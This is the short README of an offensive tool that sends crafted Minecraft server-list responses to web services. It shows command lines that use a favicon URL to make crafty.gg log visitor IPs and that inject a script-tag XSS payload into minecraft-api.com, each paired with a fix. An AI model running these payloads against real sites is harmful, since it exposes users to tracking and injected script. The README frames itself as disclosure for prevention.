# PwnCraft 🏴‍☠️

A tool built to deliver malicious payloads through [Minecraft SLP protocol](https://wiki.vg/Server_List_Ping).
Made for educational purpose, for preventing people from getting attacked by this.

## Example usages

> Use https://crafty.gg as an IP logger

Fix: Accept only favicon that starts with `png,base64...`

- `https://crafty.gg/tools/ping?ip=YOUR_IP&port=YOUR_PORT&platform=java`

- `./pwncraft localhost 1337 -f 'https://CANARY/'`

> XSS on https://minecraft-api.com

Fix: HTML escape data from server

- `https://minecraft-api.com/api/ping/YOUR_IP/YOUR_PORT`

- `./pwncraft localhost 1337 -d '<script>alert("XSS !");</script>'`

## Credits

Varint implementation: https://github.com/jsvana/async-minecraft-ping/
